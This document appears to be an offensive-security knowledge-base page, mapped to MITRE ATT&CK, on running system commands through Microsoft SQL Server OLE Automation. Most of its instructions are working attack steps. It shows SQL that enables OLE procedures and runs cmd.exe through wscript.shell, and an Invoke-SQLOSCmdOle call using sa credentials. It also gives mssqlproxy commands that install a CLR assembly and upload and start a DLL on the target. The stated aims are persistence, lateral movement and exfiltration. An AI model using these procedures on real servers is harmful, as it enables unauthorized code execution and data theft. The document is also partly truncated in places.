---
id: b1477ba3-9d05-4380-b412-4eba2755fd4e
name: MSSQL OLE Automation Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.482197+00:00'
updated_at: '2023-04-10T20:36:31.753387+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Signed Script Proxy Execution|T1216 - Signed Script Proxy Execution]]'
tags:
- '[[Execute commands using OLE automation procedures]]'
- '[[MSSQL Server]]'
- '[[OLE Automation]]'
commands:
- '[[Check current user]]'
- '[[Check Reciclador]]'
- '[[Enable OLE]]'
- '[[Install MSSQL client]]'
- '[[Start Reciclador]]'
- '[[Upload Reciclador.dll]]'
---

# MSSQL OLE Automation Command Execution

## Summary

MSSQL OLE Automation Command Execution is a technique that allows an attacker to execute commands on a MSSQL Server using OLE automation procedures. This technique requires the attacker to have access to the SQL Server with privileges to enable OLE Automation. Once enabled, the attacker can execute

## Description

# Description

MSSQL OLE Automation Command Execution is a technique that allows an attacker to execute commands on a MSSQL Server using OLE automation procedures. This technique requires the attacker to have access to the SQL Server with privileges to enable OLE Automation. Once enabled, the attacker can execute arbitrary commands using the sp_OACreate and sp_OAMethod stored procedures. This technique can be used to gain persistence, move laterally, and exfiltrate data.

## Requirements

1. Access to the MSSQL Server with privileges to enable OLE Automation

1. Knowledge of the sp_OACreate and sp_OAMethod stored procedures

## Defense

1. Disable OLE Automation if it is not required

1. Restrict privileges for enabling OLE Automation

1. Monitor for suspicious activity related to OLE Automation procedures

## Objectives

1. Execute arbitrary commands on the MSSQL Server

1. Gain persistence on the MSSQL Server

1. Move laterally within the network

1. Exfiltrate data from the MSSQL Server

# Instructions

1. Use this command to execute a command on a SQL Server instance using the sa login credentials. Replace <DBSERVERNAME\DBInstance> with the name of your SQL Server instance and database instance. The command parameter should be replaced with the command you want to execute. The Verbose switch can be added to display detailed output.

**Code**: [[Invoke-SQLOSCmdOle -Username sa -Password Password]]

> This command allows you to execute a command on a SQL Server instance using the sa login credentials. The command parameter should be replaced with the command you want to execute. The Verbose switch can be added to display detailed output. This command can be useful for automating tasks or troubleshooting SQL Server issues.

**Command** ([[Check current user]]):

```bash
whoami
```

2. To enable OLE Automation and execute commands, follow these steps:
1. Run the following commands to enable OLE Automation:
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure
2. Execute the desired commands by running the following code:
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
Note: Replace the command after '/c' with your desired command.

**Code**: [[# Enable OLE Automation
EXEC sp_configure 'show ad]]

> This command enables OLE Automation and allows the execution of commands using the 'wscript.shell' object. The 'DECLARE' statement creates a variable to store the object, and the 'EXEC SP_OACREATE' statement creates the object. The 'EXEC SP_OAMETHOD' statement executes the 'run' method of the object, which runs the specified command. Replace the command after '/c' with your desired command.

3. To install MSSQL Proxy and inject a DLL into the target system, follow these steps:
1. Download the MSSQL Proxy tool from https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
2. Open a PowerShell terminal and navigate to the directory containing the downloaded tool.
3. Run the following commands, replacing 'host', 'username', and 'password' with the appropriate values:
   python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
   python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
   python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
4. In the MSSQL prompt, run the following commands:
   SQL> enable_ole
   SQL> upload reciclador.dll C:\windows\temp\reciclador.dll

**Code**: [[# https://github.com/blackarrowsec/mssqlproxy/blob]]

> The above commands install the MSSQL Proxy tool on the target system and inject a DLL named 'reciclador.dll' into the system. The DLL is uploaded to the 'C:\windows\temp' directory. The 'enable_ole' command enables OLE automation procedures, which are required for the DLL to execute. Once the DLL is injected, it can be used to execute arbitrary code on the target system.

**Command** ([[Install MSSQL client]]):

```bash
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
```

**Command** ([[Check Reciclador]]):

```bash
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
```

**Command** ([[Start Reciclador]]):

```bash
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
```

**Command** ([[Enable OLE]]):

```bash
SQL> enable_ole
```

**Command** ([[Upload Reciclador.dll]]):

```bash
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Signed Script Proxy Execution|T1216 - Signed Script Proxy Execution]]

## Commands Used

- [[Check current user]]
- [[Check Reciclador]]
- [[Enable OLE]]
- [[Install MSSQL client]]
- [[Start Reciclador]]
- [[Upload Reciclador.dll]]

## Tags

- [[Execute commands using OLE automation procedures]]
- [[MSSQL Server]]
- [[OLE Automation]]
